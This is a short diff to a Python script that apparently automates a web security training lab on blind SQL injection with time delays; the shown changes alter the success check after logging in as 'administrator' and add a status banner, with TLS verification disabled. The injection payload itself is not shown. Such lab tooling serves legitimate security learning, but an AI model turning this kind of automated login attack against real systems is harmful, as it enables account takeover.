@@ -97,10 +97,11 @@ def login(host, password):
                'username': 'administrator',
                'password': password}
     r = client.post(url, data=payload, allow_redirects=True)
-    return 'Congratulations, you solved the lab!' in r.text
+    return 'Your username is: administrator' in r.text
 
 
 def main():
+    print('[+] Blind SQL injection with time delays and information retrieval')
     try:
         host = sys.argv[1].strip().rstrip('/')
     except IndexError:
@@ -113,6 +114,7 @@ def main():
     client = requests.Session()
     client.verify = False
     client.proxies = proxies
+
     get_tracking_cookie(client, host)
     print(f'[+] Obtained tracking cookie: {tracking_cookie}')
 
